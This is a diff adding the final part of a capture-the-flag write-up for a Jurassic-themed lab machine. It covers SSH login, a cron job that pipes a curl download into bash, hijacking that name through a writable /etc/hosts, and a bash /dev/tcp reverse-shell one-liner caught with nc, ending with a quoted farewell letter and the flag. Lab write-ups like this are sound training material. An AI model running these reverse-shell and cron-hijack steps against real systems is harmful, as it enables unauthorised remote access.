@@ -205,3 +205,62 @@ Tring with md5 bruteforce got 252000000 as time -> 35dffc90d765f825642527c6e14e3
 ```
 Bzzz... Y0U re4cH3d Tr14sS1c P3r10d...bzzz... 3nD 0f End-Permian Extinction... Quiet place. S3cr3t 4 suRv1vinG: S4v3th3E4rTh 
 ```
+
+Now we can login to the machine via `ssh -i id_rsa piero@10.10.10.6`. In the home of piero we got the first flag. Now we have to 
+privesc. In the home folder we found another user `pwnx` so I've found a strange cron task :
+
+```
+* * * * * pwnx curl jurassic.pwnx/cretaceous.sh | bash
+```
+
+and in /etc/hosts I found that jurassic.pwnx was localhost. I haven't the permission to write in /var/www/html but /etc/hosts was writable. 
+
+Got a http server running and serverd a script to the crotask `bash -i >& /dev/tcp/10.33.1.86/4000 0>&1`. Started nc on my client ad wait the minute.
+
+Now I've the $ to pwnx user. Here there are a strange file `root_it.txt` whit this content
+
+```
+Cari amici, mi spiace non essere più con voi dopo 70 anni assieme.
+Ma anche la natura ha i suoi ritmi. Sono stati anni per me molto stimolanti che mi hanno portato a conoscere il mondo e la natura umana.
+Soprattutto ho avuto la fortuna di conoscere gente che mi ha aiutato a realizzare quello che ogni uomo vorrebbe scoprire.
+Grazie alla scienza e a un metodo che permette di affrontare i problemi in modo razionale ma al tempo stesso umano.
+Malgrado una lunga malattia sono riuscito a portare a termine tutte le mie trasmissioni e i miei progetti (persino una piccola soddisfazione: un disco di jazz al pianoforte...).
+Ma anche, sedici puntate dedicate alla scuola sui problemi dell’ambiente e dell’energia.
+È stata un’avventura straordinaria, vissuta intensamente e resa possibile grazie alla collaborazione di un grande gruppo di autori, collaboratori, tecnici e scienziati.
+A mia volta, ho cercato di raccontare quello che ho imparato.
+
+Carissimi tutti, penso di aver fatto la mia parte. Cercate di fare anche voi la vostra per questo nostro difficile Paese.
+
+Un grande abbraccio.
+
+Piero Angela
+
+        .-~~-.--.
+       :         )
+ .~ ~ -.\       /.- ~~ .
+ >       `.   .'       <
+(         .- -.         )
+ `- -.-~  `- -'  ~-.- -'
+   (        :        )           _ _ .-:
+    ~--.    :    .--~        .-~  .-~  }
+        ~-.-^-.-~ \_      .~  .-~   .~
+                 \ \'     \ '_ _ -~
+                  `.`.    //
+         . - ~ ~-.__`.`-.//
+     .-~   . - ~  }~ ~ ~-.~-.
+   .' .-~      .-~       :/~-.~-./:
+  /_~_ _ . - ~                 ~-.~-._
+                                   ~-.<
+
+
+If you got a reverse shell, run:
+script /dev/null -c bash
+export TERM=xterm-256color 
+/bin/bash
+jurassic_train
+
+```
+
+Running the script we got a lolcat text with the flag!
+
+ THE FLAG `PWNX{Pr3s3Rv3_Th3_N4tUr3}`
